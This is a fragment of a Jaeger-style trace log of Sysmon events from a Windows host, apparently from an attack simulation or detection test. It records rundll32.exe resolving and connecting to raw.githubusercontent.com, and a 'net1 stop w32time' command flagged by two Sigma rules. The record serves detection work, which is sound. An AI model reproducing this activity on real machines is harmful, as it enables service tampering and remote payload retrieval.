+                                   {
+                                       "key":  "TimeStamp",
+                                       "type":  "string",
+                                       "value":  "09/25/2025 02:45:14"
+                                   },
+                                   {
+                                       "key":  "User",
+                                       "type":  "string",
+                                       "value":  "WIN-JQPCJUH0S05\\Administrator"
+                                   },
+                                   {
+                                       "key":  "UtcTime",
+                                       "type":  "string",
+                                       "value":  "2025-09-25 09:45:14.938"
+                                   },
+                                   {
+                                       "key":  "channel",
+                                       "type":  "string",
+                                       "value":  "Sysmon"
+                                   },
+                                   {
+                                       "key":  "otel.scope.name",
+                                       "type":  "string",
+                                       "value":  "event.agent"
+                                   },
+                                   {
+                                       "key":  "span.kind",
+                                       "type":  "string",
+                                       "value":  "internal"
+                                   },
+                                   {
+                                       "key":  "sysmon.opcode",
+                                       "type":  "string",
+                                       "value":  "Info"
+                                   },
+                                   {
+                                       "key":  "sysmon.ppid",
+                                       "type":  "int64",
+                                       "value":  5636
+                                   },
+                                   {
+                                       "key":  "user_id",
+                                       "type":  "string",
+                                       "value":  "sj"
+                                   }
+                               ],
+                      "logs":  [
+
+                               ],
+                      "processID":  "p1",
+                      "warnings":  [
+                                       "invalid parent span IDs=c0bf6195a65a0fd0; skipping clock skew adjustment"
+                                   ]
+                  },
+                  {
+                      "traceID":  "c2cf81e913a80a9afae296465b5b8589",
+                      "spanID":  "22e2ce4acc770c3c",
+                      "operationName":  "net.exe@evt:5",
+                      "references":  [
+                                         {
+                                             "refType":  "CHILD_OF",
+                                             "traceID":  "c2cf81e913a80a9afae296465b5b8589",
+                                             "spanID":  "2b759ee4b84eadaf"
+                                         }
+                                     ],
+                      "startTime":  1758793509536285,
+                      "duration":  5319,
+                      "tags":  [
+                                   {
+                                       "key":  "EventName",
+                                       "type":  "string",
+                                       "value":  "Processterminated(rule:ProcessTerminate)"
+                                   },
+                                   {
+                                       "key":  "ID",
+                                       "type":  "int64",
+                                       "value":  5
+                                   },
+                                   {
+                                       "key":  "Image",
+                                       "type":  "string",
+                                       "value":  "C:\\Windows\\System32\\net.exe"
+                                   },
+                                   {
+                                       "key":  "ProcessGuid",
+                                       "type":  "string",
+                                       "value":  "7c13b5df-0f23-68d5-1302-000000000300"
+                                   },
+                                   {
+                                       "key":  "ProcessId",
+                                       "type":  "int64",
+                                       "value":  6112
+                                   },
+                                   {
+                                       "key":  "ProviderGuid",
+                                       "type":  "string",
+                                       "value":  "5770385f-c22a-43e0-bf4c-06f5698ffbd9"
+                                   },
+                                   {
+                                       "key":  "RuleName",
+                                       "type":  "string",
+                                       "value":  "-"
+                                   },
+                                   {
+                                       "key":  "TimeStamp",
+                                       "type":  "string",
+                                       "value":  "09/25/2025 02:45:08"
+                                   },
+                                   {
+                                       "key":  "User",
+                                       "type":  "string",
+                                       "value":  "WIN-JQPCJUH0S05\\Administrator"
+                                   },
+                                   {
+                                       "key":  "UtcTime",
+                                       "type":  "string",
+                                       "value":  "2025-09-25 09:45:08.881"
+                                   },
+                                   {
+                                       "key":  "channel",
+                                       "type":  "string",
+                                       "value":  "Sysmon"
+                                   },
+                                   {
+                                       "key":  "otel.scope.name",
+                                       "type":  "string",
+                                       "value":  "event.agent"
+                                   },
+                                   {
+                                       "key":  "span.kind",
+                                       "type":  "string",
+                                       "value":  "internal"
+                                   },
+                                   {
+                                       "key":  "sysmon.opcode",
+                                       "type":  "string",
+                                       "value":  "Info"
+                                   },
+                                   {
+                                       "key":  "sysmon.ppid",
+                                       "type":  "int64",
+                                       "value":  2984
+                                   },
+                                   {
+                                       "key":  "user_id",
+                                       "type":  "string",
+                                       "value":  "sj"
+                                   }
+                               ],
+                      "logs":  [
+
+                               ],
+                      "processID":  "p1",
+                      "warnings":  [
+                                       "invalid parent span IDs=2b759ee4b84eadaf; skipping clock skew adjustment"
+                                   ]
+                  },
+                  {
+                      "traceID":  "c2cf81e913a80a9afae296465b5b8589",
+                      "spanID":  "9da1b6042f9eef8b",
+                      "operationName":  "rundll32.exe@evt:3",
+                      "references":  [
+                                         {
+                                             "refType":  "CHILD_OF",
+                                             "traceID":  "c2cf81e913a80a9afae296465b5b8589",
+                                             "spanID":  "c0bf6195a65a0fd0"
+                                         }
+                                     ],
+                      "startTime":  1758793515522208,
+                      "duration":  2649,
+                      "tags":  [
+                                   {
+                                       "key":  "DestinationHostname",
+                                       "type":  "string",
+                                       "value":  "-"
+                                   },
+                                   {
+                                       "key":  "DestinationIp",
+                                       "type":  "string",
+                                       "value":  "20.200.245.247"
+                                   },
+                                   {
+                                       "key":  "DestinationIsIpv6",
+                                       "type":  "bool",
+                                       "value":  false
+                                   },
+                                   {
+                                       "key":  "DestinationPort",
+                                       "type":  "int64",
+                                       "value":  443
+                                   },
+                                   {
+                                       "key":  "DestinationPortName",
+                                       "type":  "string",
+                                       "value":  "https"
+                                   },
+                                   {
+                                       "key":  "EventName",
+                                       "type":  "string",
+                                       "value":  "Networkconnectiondetected(rule:NetworkConnect)"
+                                   },
+                                   {
+                                       "key":  "ID",
+                                       "type":  "int64",
+                                       "value":  3
+                                   },
+                                   {
+                                       "key":  "Image",
+                                       "type":  "string",
+                                       "value":  "C:\\Windows\\System32\\rundll32.exe"
+                                   },
+                                   {
+                                       "key":  "Initiated",
+                                       "type":  "bool",
+                                       "value":  true
+                                   },
+                                   {
+                                       "key":  "ProcessGuid",
+                                       "type":  "string",
+                                       "value":  "7c13b5df-0f29-68d5-4802-000000000300"
+                                   },
+                                   {
+                                       "key":  "ProcessId",
+                                       "type":  "int64",
+                                       "value":  6112
+                                   },
+                                   {
+                                       "key":  "Protocol",
+                                       "type":  "string",
+                                       "value":  "tcp"
+                                   },
+                                   {
+                                       "key":  "ProviderGuid",
+                                       "type":  "string",
+                                       "value":  "5770385f-c22a-43e0-bf4c-06f5698ffbd9"
+                                   },
+                                   {
+                                       "key":  "RuleName",
+                                       "type":  "string",
+                                       "value":  "-"
+                                   },
+                                   {
+                                       "key":  "SourceHostname",
+                                       "type":  "string",
+                                       "value":  "WIN-JQPCJUH0S05.localdomain"
+                                   },
+                                   {
+                                       "key":  "SourceIp",
+                                       "type":  "string",
+                                       "value":  "192.168.238.136"
+                                   },
+                                   {
+                                       "key":  "SourceIsIpv6",
+                                       "type":  "bool",
+                                       "value":  false
+                                   },
+                                   {
+                                       "key":  "SourcePort",
+                                       "type":  "int64",
+                                       "value":  -15632
+                                   },
+                                   {
+                                       "key":  "SourcePortName",
+                                       "type":  "string",
+                                       "value":  "-"
+                                   },
+                                   {
+                                       "key":  "TimeStamp",
+                                       "type":  "string",
+                                       "value":  "09/25/2025 02:45:14"
+                                   },
+                                   {
+                                       "key":  "User",
+                                       "type":  "string",
+                                       "value":  "WIN-JQPCJUH0S05\\Administrator"
+                                   },
+                                   {
+                                       "key":  "UtcTime",
+                                       "type":  "string",
+                                       "value":  "2025-09-25 09:45:13.585"
+                                   },
+                                   {
+                                       "key":  "channel",
+                                       "type":  "string",
+                                       "value":  "Sysmon"
+                                   },
+                                   {
+                                       "key":  "otel.scope.name",
+                                       "type":  "string",
+                                       "value":  "event.agent"
+                                   },
+                                   {
+                                       "key":  "span.kind",
+                                       "type":  "string",
+                                       "value":  "internal"
+                                   },
+                                   {
+                                       "key":  "sysmon.opcode",
+                                       "type":  "string",
+                                       "value":  "Info"
+                                   },
+                                   {
+                                       "key":  "sysmon.ppid",
+                                       "type":  "int64",
+                                       "value":  5636
+                                   },
+                                   {
+                                       "key":  "user_id",
+                                       "type":  "string",
+                                       "value":  "sj"
+                                   }
+                               ],
+                      "logs":  [
+
+                               ],
+                      "processID":  "p1",
+                      "warnings":  [
+                                       "invalid parent span IDs=c0bf6195a65a0fd0; skipping clock skew adjustment"
+                                   ]
+                  },
+                  {
+                      "traceID":  "c2cf81e913a80a9afae296465b5b8589",
+                      "spanID":  "1f3239a44f2975ba",
+                      "operationName":  "rundll32.exe@evt:3",
+                      "references":  [
+                                         {
+                                             "refType":  "CHILD_OF",
+                                             "traceID":  "c2cf81e913a80a9afae296465b5b8589",
+                                             "spanID":  "ef74c6a5d0a4faca"
+                                         }
+                                     ],
+                      "startTime":  1758793516530589,
+                      "duration":  275,
+                      "tags":  [
+                                   {
+                                       "key":  "DestinationHostname",
+                                       "type":  "string",
+                                       "value":  "-"
+                                   },
+                                   {
+                                       "key":  "DestinationIp",
+                                       "type":  "string",
+                                       "value":  "172.64.149.23"
+                                   },
+                                   {
+                                       "key":  "DestinationIsIpv6",
+                                       "type":  "bool",
+                                       "value":  false
+                                   },
+                                   {
+                                       "key":  "DestinationPort",
+                                       "type":  "int64",
+                                       "value":  80
+                                   },
+                                   {
+                                       "key":  "DestinationPortName",
+                                       "type":  "string",
+                                       "value":  "http"
+                                   },
+                                   {
+                                       "key":  "EventName",
+                                       "type":  "string",
+                                       "value":  "Networkconnectiondetected(rule:NetworkConnect)"
+                                   },
+                                   {
+                                       "key":  "ID",
+                                       "type":  "int64",
+                                       "value":  3
+                                   },
+                                   {
+                                       "key":  "Image",
+                                       "type":  "string",
+                                       "value":  "C:\\Windows\\System32\\rundll32.exe"
+                                   },
+                                   {
+                                       "key":  "Initiated",
+                                       "type":  "bool",
+                                       "value":  true
+                                   },
+                                   {
+                                       "key":  "ProcessGuid",
+                                       "type":  "string",
+                                       "value":  "7c13b5df-0f29-68d5-4802-000000000300"
+                                   },
+                                   {
+                                       "key":  "ProcessId",
+                                       "type":  "int64",
+                                       "value":  6112
+                                   },
+                                   {
+                                       "key":  "Protocol",
+                                       "type":  "string",
+                                       "value":  "tcp"
+                                   },
+                                   {
+                                       "key":  "ProviderGuid",
+                                       "type":  "string",
+                                       "value":  "5770385f-c22a-43e0-bf4c-06f5698ffbd9"
+                                   },
+                                   {
+                                       "key":  "RuleName",
+                                       "type":  "string",
+                                       "value":  "-"
+                                   },
+                                   {
+                                       "key":  "SourceHostname",
+                                       "type":  "string",
+                                       "value":  "WIN-JQPCJUH0S05.localdomain"
+                                   },
+                                   {
+                                       "key":  "SourceIp",
+                                       "type":  "string",
+                                       "value":  "192.168.238.136"
+                                   },
+                                   {
+                                       "key":  "SourceIsIpv6",
+                                       "type":  "bool",
+                                       "value":  false
+                                   },
+                                   {
+                                       "key":  "SourcePort",
+                                       "type":  "int64",
+                                       "value":  -15630
+                                   },
+                                   {
+                                       "key":  "SourcePortName",
+                                       "type":  "string",
+                                       "value":  "-"
+                                   },
+                                   {
+                                       "key":  "TimeStamp",
+                                       "type":  "string",
+                                       "value":  "09/25/2025 02:45:15"
+                                   },
+                                   {
+                                       "key":  "User",
+                                       "type":  "string",
+                                       "value":  "WIN-JQPCJUH0S05\\Administrator"
+                                   },
+                                   {
+                                       "key":  "UtcTime",
+                                       "type":  "string",
+                                       "value":  "2025-09-25 09:45:14.361"
+                                   },
+                                   {
+                                       "key":  "channel",
+                                       "type":  "string",
+                                       "value":  "Sysmon"
+                                   },
+                                   {
+                                       "key":  "otel.scope.name",
+                                       "type":  "string",
+                                       "value":  "event.agent"
+                                   },
+                                   {
+                                       "key":  "span.kind",
+                                       "type":  "string",
+                                       "value":  "internal"
+                                   },
+                                   {
+                                       "key":  "sysmon.opcode",
+                                       "type":  "string",
+                                       "value":  "Info"
+                                   },
+                                   {
+                                       "key":  "sysmon.ppid",
+                                       "type":  "int64",
+                                       "value":  5636
+                                   },
+                                   {
+                                       "key":  "user_id",
+                                       "type":  "string",
+                                       "value":  "sj"
+                                   }
+                               ],
+                      "logs":  [
+
+                               ],
+                      "processID":  "p1",
+                      "warnings":  [
+                                       "invalid parent span IDs=ef74c6a5d0a4faca; skipping clock skew adjustment"
+                                   ]
+                  },
+                  {
+                      "traceID":  "c2cf81e913a80a9afae296465b5b8589",
+                      "spanID":  "1f64139eafdc2b3f",
+                      "operationName":  "conhost.exe@evt:5",
+                      "references":  [
+                                         {
+                                             "refType":  "CHILD_OF",
+                                             "traceID":  "c2cf81e913a80a9afae296465b5b8589",
+                                             "spanID":  "58668a4a72356cdc"
+                                         }
+                                     ],
+                      "startTime":  1758793502389406,
+                      "duration":  11131,
+                      "tags":  [
+                                   {
+                                       "key":  "EventName",
+                                       "type":  "string",
+                                       "value":  "Processterminated(rule:ProcessTerminate)"
+                                   },
+                                   {
+                                       "key":  "ID",
+                                       "type":  "int64",
+                                       "value":  5
+                                   },
+                                   {
+                                       "key":  "Image",
+                                       "type":  "string",
+                                       "value":  "C:\\Windows\\System32\\conhost.exe"
+                                   },
+                                   {
+                                       "key":  "ProcessGuid",
+                                       "type":  "string",
+                                       "value":  "7c13b5df-0f1c-68d5-e301-000000000300"
+                                   },
+                                   {
+                                       "key":  "ProcessId",
+                                       "type":  "int64",
+                                       "value":  6112
+                                   },
+                                   {
+                                       "key":  "ProviderGuid",
+                                       "type":  "string",
+                                       "value":  "5770385f-c22a-43e0-bf4c-06f5698ffbd9"
+                                   },
+                                   {
+                                       "key":  "RuleName",
+                                       "type":  "string",
+                                       "value":  "-"
+                                   },
+                                   {
+                                       "key":  "TimeStamp",
+                                       "type":  "string",
+                                       "value":  "09/25/2025 02:45:01"
+                                   },
+                                   {
+                                       "key":  "User",
+                                       "type":  "string",
+                                       "value":  "WIN-JQPCJUH0S05\\Administrator"
+                                   },
+                                   {
+                                       "key":  "UtcTime",
+                                       "type":  "string",
+                                       "value":  "2025-09-25 09:45:01.313"
+                                   },
+                                   {
+                                       "key":  "channel",
+                                       "type":  "string",
+                                       "value":  "Sysmon"
+                                   },
+                                   {
+                                       "key":  "otel.scope.name",
+                                       "type":  "string",
+                                       "value":  "event.agent"
+                                   },
+                                   {
+                                       "key":  "span.kind",
+                                       "type":  "string",
+                                       "value":  "internal"
+                                   },
+                                   {
+                                       "key":  "sysmon.opcode",
+                                       "type":  "string",
+                                       "value":  "Info"
+                                   },
+                                   {
+                                       "key":  "sysmon.ppid",
+                                       "type":  "int64",
+                                       "value":  0
+                                   },
+                                   {
+                                       "key":  "user_id",
+                                       "type":  "string",
+                                       "value":  "sj"
+                                   }
+                               ],
+                      "logs":  [
+
+                               ],
+                      "processID":  "p1",
+                      "warnings":  [
+                                       "invalid parent span IDs=58668a4a72356cdc; skipping clock skew adjustment"
+                                   ]
+                  },
+                  {
+                      "traceID":  "c2cf81e913a80a9afae296465b5b8589",
+                      "spanID":  "1f94ae7cb919d52a",
+                      "operationName":  "rundll32.exe@evt:22",
+                      "references":  [
+                                         {
+                                             "refType":  "CHILD_OF",
+                                             "traceID":  "c2cf81e913a80a9afae296465b5b8589",
+                                             "spanID":  "b8865304f54b6e48"
+                                         }
+                                     ],
+                      "startTime":  1758793515501023,
+                      "duration":  467,
+                      "tags":  [
+                                   {
+                                       "key":  "EventName",
+                                       "type":  "string",
+                                       "value":  "Dnsquery(rule:DnsQuery)"
+                                   },
+                                   {
+                                       "key":  "ID",
+                                       "type":  "int64",
+                                       "value":  22
+                                   },
+                                   {
+                                       "key":  "Image",
+                                       "type":  "string",
+                                       "value":  "C:\\Windows\\System32\\rundll32.exe"
+                                   },
+                                   {
+                                       "key":  "ProcessGuid",
+                                       "type":  "string",
+                                       "value":  "7c13b5df-0f29-68d5-4802-000000000300"
+                                   },
+                                   {
+                                       "key":  "ProcessId",
+                                       "type":  "int64",
+                                       "value":  6112
+                                   },
+                                   {
+                                       "key":  "ProviderGuid",
+                                       "type":  "string",
+                                       "value":  "5770385f-c22a-43e0-bf4c-06f5698ffbd9"
+                                   },
+                                   {
+                                       "key":  "QueryName",
+                                       "type":  "string",
+                                       "value":  "github.com"
+                                   },
+                                   {
+                                       "key":  "QueryResults",
+                                       "type":  "string",
+                                       "value":  "::ffff:20.200.245.247;"
+                                   },
+                                   {
+                                       "key":  "QueryStatus",
+                                       "type":  "string",
+                                       "value":  "0"
+                                   },
+                                   {
+                                       "key":  "RuleName",
+                                       "type":  "string",
+                                       "value":  "-"
+                                   },
+                                   {
+                                       "key":  "TimeStamp",
+                                       "type":  "string",
+                                       "value":  "09/25/2025 02:45:14"
+                                   },
+                                   {
+                                       "key":  "User",
+                                       "type":  "string",
+                                       "value":  "WIN-JQPCJUH0S05\\Administrator"
+                                   },
+                                   {
+                                       "key":  "UtcTime",
+                                       "type":  "string",
+                                       "value":  "2025-09-25 09:45:13.568"
+                                   },
+                                   {
+                                       "key":  "channel",
+                                       "type":  "string",
+                                       "value":  "Sysmon"
+                                   },
+                                   {
+                                       "key":  "otel.scope.name",
+                                       "type":  "string",
+                                       "value":  "event.agent"
+                                   },
+                                   {
+                                       "key":  "span.kind",
+                                       "type":  "string",
+                                       "value":  "internal"
+                                   },
+                                   {
+                                       "key":  "sysmon.opcode",
+                                       "type":  "string",
+                                       "value":  "Info"
+                                   },
+                                   {
+                                       "key":  "sysmon.ppid",
+                                       "type":  "int64",
+                                       "value":  5636
+                                   },
+                                   {
+                                       "key":  "user_id",
+                                       "type":  "string",
+                                       "value":  "sj"
+                                   }
+                               ],
+                      "logs":  [
+
+                               ],
+                      "processID":  "p1",
+                      "warnings":  [
+                                       "invalid parent span IDs=b8865304f54b6e48; skipping clock skew adjustment"
+                                   ]
+                  },
+                  {
+                      "traceID":  "c2cf81e913a80a9afae296465b5b8589",
+                      "spanID":  "4ddafa7151e49b34",
+                      "operationName":  "rundll32.exe@evt:22",
+                      "references":  [
+                                         {
+                                             "refType":  "CHILD_OF",
+                                             "traceID":  "c2cf81e913a80a9afae296465b5b8589",
+                                             "spanID":  "c0bf6195a65a0fd0"
+                                         }
+                                     ],
+                      "startTime":  1758793515501528,
+                      "duration":  387,
+                      "tags":  [
+                                   {
+                                       "key":  "EventName",
+                                       "type":  "string",
+                                       "value":  "Dnsquery(rule:DnsQuery)"
+                                   },
+                                   {
+                                       "key":  "ID",
+                                       "type":  "int64",
+                                       "value":  22
+                                   },
+                                   {
+                                       "key":  "Image",
+                                       "type":  "string",
+                                       "value":  "C:\\Windows\\System32\\rundll32.exe"
+                                   },
+                                   {
+                                       "key":  "ProcessGuid",
+                                       "type":  "string",
+                                       "value":  "7c13b5df-0f29-68d5-4802-000000000300"
+                                   },
+                                   {
+                                       "key":  "ProcessId",
+                                       "type":  "int64",
+                                       "value":  6112
+                                   },
+                                   {
+                                       "key":  "ProviderGuid",
+                                       "type":  "string",
+                                       "value":  "5770385f-c22a-43e0-bf4c-06f5698ffbd9"
+                                   },
+                                   {
+                                       "key":  "QueryName",
+                                       "type":  "string",
+                                       "value":  "raw.githubusercontent.com"
+                                   },
+                                   {
+                                       "key":  "QueryResults",
+                                       "type":  "string",
+                                       "value":  "::ffff:185.199.108.133;::ffff:185.199.110.133;::ffff:185.199.109.133;::ffff:185.199.111.133;"
+                                   },
+                                   {
+                                       "key":  "QueryStatus",
+                                       "type":  "string",
+                                       "value":  "0"
+                                   },
+                                   {
+                                       "key":  "RuleName",
+                                       "type":  "string",
+                                       "value":  "-"
+                                   },
+                                   {
+                                       "key":  "TimeStamp",
+                                       "type":  "string",
+                                       "value":  "09/25/2025 02:45:14"
+                                   },
+                                   {
+                                       "key":  "User",
+                                       "type":  "string",
+                                       "value":  "WIN-JQPCJUH0S05\\Administrator"
+                                   },
+                                   {
+                                       "key":  "UtcTime",
+                                       "type":  "string",
+                                       "value":  "2025-09-25 09:45:14.162"
+                                   },
+                                   {
+                                       "key":  "channel",
+                                       "type":  "string",
+                                       "value":  "Sysmon"
+                                   },
+                                   {
+                                       "key":  "otel.scope.name",
+                                       "type":  "string",
+                                       "value":  "event.agent"
+                                   },
+                                   {
+                                       "key":  "span.kind",
+                                       "type":  "string",
+                                       "value":  "internal"
+                                   },
+                                   {
+                                       "key":  "sysmon.opcode",
+                                       "type":  "string",
+                                       "value":  "Info"
+                                   },
+                                   {
+                                       "key":  "sysmon.ppid",
+                                       "type":  "int64",
+                                       "value":  5636
+                                   },
+                                   {
+                                       "key":  "user_id",
+                                       "type":  "string",
+                                       "value":  "sj"
+                                   }
+                               ],
+                      "logs":  [
+
+                               ],
+                      "processID":  "p1",
+                      "warnings":  [
+                                       "duplicate span IDs; skipping clock skew adjustment"
+                                   ]
+                  },
+                  {
+                      "traceID":  "c2cf81e913a80a9afae296465b5b8589",
+                      "spanID":  "e05e17f8ea214b5c",
+                      "operationName":  "rundll32.exe@evt:3",
+                      "references":  [
+                                         {
+                                             "refType":  "CHILD_OF",
+                                             "traceID":  "c2cf81e913a80a9afae296465b5b8589",
+                                             "spanID":  "ef74c6a5d0a4faca"
+                                         }
+                                     ],
+                      "startTime":  1758793516528634,
+                      "duration":  1093,
+                      "tags":  [
+                                   {
+                                       "key":  "DestinationHostname",
+                                       "type":  "string",
+                                       "value":  "cdn-185-199-108-133.github.com"
+                                   },
+                                   {
+                                       "key":  "DestinationIp",
+                                       "type":  "string",
+                                       "value":  "185.199.108.133"
+                                   },
+                                   {
+                                       "key":  "DestinationIsIpv6",
+                                       "type":  "bool",
+                                       "value":  false
+                                   },
+                                   {
+                                       "key":  "DestinationPort",
+                                       "type":  "int64",
+                                       "value":  443
+                                   },
+                                   {
+                                       "key":  "DestinationPortName",
+                                       "type":  "string",
+                                       "value":  "https"
+                                   },
+                                   {
+                                       "key":  "EventName",
+                                       "type":  "string",
+                                       "value":  "Networkconnectiondetected(rule:NetworkConnect)"
+                                   },
+                                   {
+                                       "key":  "ID",
+                                       "type":  "int64",
+                                       "value":  3
+                                   },
+                                   {
+                                       "key":  "Image",
+                                       "type":  "string",
+                                       "value":  "C:\\Windows\\System32\\rundll32.exe"
+                                   },
+                                   {
+                                       "key":  "Initiated",
+                                       "type":  "bool",
+                                       "value":  true
+                                   },
+                                   {
+                                       "key":  "ProcessGuid",
+                                       "type":  "string",
+                                       "value":  "7c13b5df-0f29-68d5-4802-000000000300"
+                                   },
+                                   {
+                                       "key":  "ProcessId",
+                                       "type":  "int64",
+                                       "value":  6112
+                                   },
+                                   {
+                                       "key":  "Protocol",
+                                       "type":  "string",
+                                       "value":  "tcp"
+                                   },
+                                   {
+                                       "key":  "ProviderGuid",
+                                       "type":  "string",
+                                       "value":  "5770385f-c22a-43e0-bf4c-06f5698ffbd9"
+                                   },
+                                   {
+                                       "key":  "RuleName",
+                                       "type":  "string",
+                                       "value":  "-"
+                                   },
+                                   {
+                                       "key":  "SourceHostname",
+                                       "type":  "string",
+                                       "value":  "WIN-JQPCJUH0S05.localdomain"
+                                   },
+                                   {
+                                       "key":  "SourceIp",
+                                       "type":  "string",
+                                       "value":  "192.168.238.136"
+                                   },
+                                   {
+                                       "key":  "SourceIsIpv6",
+                                       "type":  "bool",
+                                       "value":  false
+                                   },
+                                   {
+                                       "key":  "SourcePort",
+                                       "type":  "int64",
+                                       "value":  -15631
+                                   },
+                                   {
+                                       "key":  "SourcePortName",
+                                       "type":  "string",
+                                       "value":  "-"
+                                   },
+                                   {
+                                       "key":  "TimeStamp",
+                                       "type":  "string",
+                                       "value":  "09/25/2025 02:45:15"
+                                   },
+                                   {
+                                       "key":  "User",
+                                       "type":  "string",
+                                       "value":  "WIN-JQPCJUH0S05\\Administrator"
+                                   },
+                                   {
+                                       "key":  "UtcTime",
+                                       "type":  "string",
+                                       "value":  "2025-09-25 09:45:14.177"
+                                   },
+                                   {
+                                       "key":  "channel",
+                                       "type":  "string",
+                                       "value":  "Sysmon"
+                                   },
+                                   {
+                                       "key":  "otel.scope.name",
+                                       "type":  "string",
+                                       "value":  "event.agent"
+                                   },
+                                   {
+                                       "key":  "span.kind",
+                                       "type":  "string",
+                                       "value":  "internal"
+                                   },
+                                   {
+                                       "key":  "sysmon.opcode",
+                                       "type":  "string",
+                                       "value":  "Info"
+                                   },
+                                   {
+                                       "key":  "sysmon.ppid",
+                                       "type":  "int64",
+                                       "value":  5636
+                                   },
+                                   {
+                                       "key":  "user_id",
+                                       "type":  "string",
+                                       "value":  "sj"
+                                   }
+                               ],
+                      "logs":  [
+
+                               ],
+                      "processID":  "p1",
+                      "warnings":  [
+                                       "invalid parent span IDs=ef74c6a5d0a4faca; skipping clock skew adjustment"
+                                   ]
+                  },
+                  {
+                      "traceID":  "c2cf81e913a80a9afae296465b5b8589",
+                      "spanID":  "b80072d68a465d14",
+                      "operationName":  "net1.exe@evt:1",
+                      "references":  [
+                                         {
+                                             "refType":  "CHILD_OF",
+                                             "traceID":  "c2cf81e913a80a9afae296465b5b8589",
+                                             "spanID":  "d5adb871aa6fa300"
+                                         }
+                                     ],
+                      "startTime":  1758793508456018,
+                      "duration":  975,
+                      "tags":  [
+                                   {
+                                       "key":  "CommandLine",
+                                       "type":  "string",
+                                       "value":  "C:\\Windows\\system32\\net1 stop w32time"
+                                   },
+                                   {
+                                       "key":  "Company",
+                                       "type":  "string",
+                                       "value":  "Microsoft Corporation"
+                                   },
+                                   {
+                                       "key":  "CurrentDirectory",
+                                       "type":  "string",
+                                       "value":  "C:\\Users\\Administrator\\AppData\\Local\\Temp\\"
+                                   },
+                                   {
+                                       "key":  "Description",
+                                       "type":  "string",
+                                       "value":  "Net Command"
+                                   },
+                                   {
+                                       "key":  "EventName",
+                                       "type":  "string",
+                                       "value":  "ProcessCreate(rule:ProcessCreate)"
+                                   },
+                                   {
+                                       "key":  "FileVersion",
+                                       "type":  "string",
+                                       "value":  "10.0.20348.469 (WinBuild.160101.0800)"
+                                   },
+                                   {
+                                       "key":  "Hashes",
+                                       "type":  "string",
+                                       "value":  "MD5=36EC62D75C7B1C6C6D166995C9662DD5,SHA256=CB320DFCD6B635BD13AD840FD271E134CC5318339487894FA90E7101195FAE23,IMPHASH=76EE66A0F294EAB08DCAEF5E64FBF02F"
+                                   },
+                                   {
+                                       "key":  "ID",
+                                       "type":  "int64",
+                                       "value":  1
+                                   },
+                                   {
+                                       "key":  "Image",
+                                       "type":  "string",
+                                       "value":  "C:\\Windows\\System32\\net1.exe"
+                                   },
+                                   {
+                                       "key":  "IntegrityLevel",
+                                       "type":  "string",
+                                       "value":  "High"
+                                   },
+                                   {
+                                       "key":  "LogonGuid",
+                                       "type":  "string",
+                                       "value":  "7c13b5df-0d7d-68d5-0f8e-070000000000"
+                                   },
+                                   {
+                                       "key":  "LogonId",
+                                       "type":  "int64",
+                                       "value":  495119
+                                   },
+                                   {
+                                       "key":  "OriginalFileName",
+                                       "type":  "string",
+                                       "value":  "net1.exe"
+                                   },
+                                   {
+                                       "key":  "ParentCommandLine",
+                                       "type":  "string",
+                                       "value":  "\"C:\\Windows\\system32\\net.exe\" stop w32time"
+                                   },
+                                   {
+                                       "key":  "ParentImage",
+                                       "type":  "string",
+                                       "value":  "C:\\Windows\\System32\\net.exe"
+                                   },
+                                   {
+                                       "key":  "ParentProcessGuid",
+                                       "type":  "string",
+                                       "value":  "7c13b5df-0f23-68d5-1302-000000000300"
+                                   },
+                                   {
+                                       "key":  "ParentProcessId",
+                                       "type":  "int64",
+                                       "value":  6112
+                                   },
+                                   {
+                                       "key":  "ParentUser",
+                                       "type":  "string",
+                                       "value":  "WIN-JQPCJUH0S05\\Administrator"
+                                   },
+                                   {
+                                       "key":  "ProcessGuid",
+                                       "type":  "string",
+                                       "value":  "7c13b5df-0f23-68d5-1402-000000000300"
+                                   },
+                                   {
+                                       "key":  "ProcessId",
+                                       "type":  "int64",
+                                       "value":  2104
+                                   },
+                                   {
+                                       "key":  "Product",
+                                       "type":  "string",
+                                       "value":  "MicrosoftÂ® WindowsÂ® Operating System"
+                                   },
+                                   {
+                                       "key":  "ProviderGuid",
+                                       "type":  "string",
+                                       "value":  "5770385f-c22a-43e0-bf4c-06f5698ffbd9"
+                                   },
+                                   {
+                                       "key":  "RuleName",
+                                       "type":  "string",
+                                       "value":  "-"
+                                   },
+                                   {
+                                       "key":  "TerminalSessionId",
+                                       "type":  "int64",
+                                       "value":  1
+                                   },
+                                   {
+                                       "key":  "TimeStamp",
+                                       "type":  "string",
+                                       "value":  "09/25/2025 02:45:07"
+                                   },
+                                   {
+                                       "key":  "User",
+                                       "type":  "string",
+                                       "value":  "WIN-JQPCJUH0S05\\Administrator"
+                                   },
+                                   {
+                                       "key":  "UtcTime",
+                                       "type":  "string",
+                                       "value":  "2025-09-25 09:45:07.680"
+                                   },
+                                   {
+                                       "key":  "channel",
+                                       "type":  "string",
+                                       "value":  "Sysmon"
+                                   },
+                                   {
+                                       "key":  "error",
+                                       "type":  "bool",
+                                       "value":  true
+                                   },
+                                   {
+                                       "key":  "otel.scope.name",
+                                       "type":  "string",
+                                       "value":  "event.agent"
+                                   },
+                                   {
+                                       "key":  "otel.status_code",
+                                       "type":  "string",
+                                       "value":  "ERROR"
+                                   },
+                                   {
+                                       "key":  "otel.status_description",
+                                       "type":  "string",
+                                       "value":  "Sigma rules matched: 2"
+                                   },
+                                   {
+                                       "key":  "sigma.alert",
+                                       "type":  "string",
+                                       "value":  "[\"88872991-7445-4a22-90b2-a3adadb0e827\",\"b243b280-65fe-48df-ba07-6ddea7646427\"]"
+                                   },
+                                   {
+                                       "key":  "sigma.match_count",
+                                       "type":  "int64",
+                                       "value":  2
+                                   },
+                                   {
+                                       "key":  "sigma.rule_title",
+                                       "type":  "string",
+                                       "value":  "[\"Stop Windows Service Via Net.EXE\",\"Discovery of a System Time\"]"
+                                   },
+                                   {
+                                       "key":  "span.kind",
+                                       "type":  "string",
+                                       "value":  "internal"
+                                   },
+                                   {
+                                       "key":  "sysmon.opcode",
+                                       "type":  "string",
+                                       "value":  "Info"
+                                   },
+                                   {
+                                       "key":  "sysmon.ppid",
+                                       "type":  "int64",
+                                       "value":  6112
+                                   },
+                                   {
+                                       "key":  "user_id",
+                                       "type":  "string",
+                                       "value":  "sj"
+                                   }
+                               ],
+                      "logs":  [
+
+                               ],
+                      "processID":  "p1",
+                      "warnings":  [
+                                       "clock skew adjustment disabled; not applying calculated delta of -3.94875ms"
+                                   ]
+                  },
+                  {
+                      "traceID":  "c2cf81e913a80a9afae296465b5b8589",
